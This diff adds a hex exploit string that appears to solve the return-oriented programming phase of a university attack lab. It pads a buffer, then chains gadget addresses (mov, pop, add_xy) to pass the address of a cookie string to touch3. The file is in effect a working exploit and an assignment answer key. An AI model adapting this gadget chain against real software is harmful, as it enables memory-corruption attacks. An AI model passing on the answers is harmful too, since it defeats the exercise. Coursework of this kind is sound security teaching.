@@ -1,0 +1,17 @@
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 /* buffer */
+7c 1d 40 55 55 55 00 00 /* step1: mov  %rsp, %rax */
+af 1c 40 55 55 55 00 00 /* step2: mov %rax, %rdi */
+a5 1c 40 55 55 55 00 00 /* step3: pop %rax */
+48 00 00 00 00 00 00 00 /* step4: constant 0x48 */
+6e 1d 40 55 55 55 00 00 /* step5: movl %eax, %edx */
+0a 1d 40 55 55 55 00 00 /* step6: movl %edx, %ecx */
+4c 1d 40 55 55 55 00 00 /* step7: movl %ecx, %esi */
+d5 1c 40 55 55 55 00 00 /* step8: add_xy */
+af 1c 40 55 55 55 00 00 /* step9: mov %rax, %rdi */ 
+f7 1b 40 55 55 55 00 00 /* step10: touch3 address */
+37 36 39 32 37 62 62 66 /* step11: string representtion of cookie */
+00 00 00 00 00 00 00 00
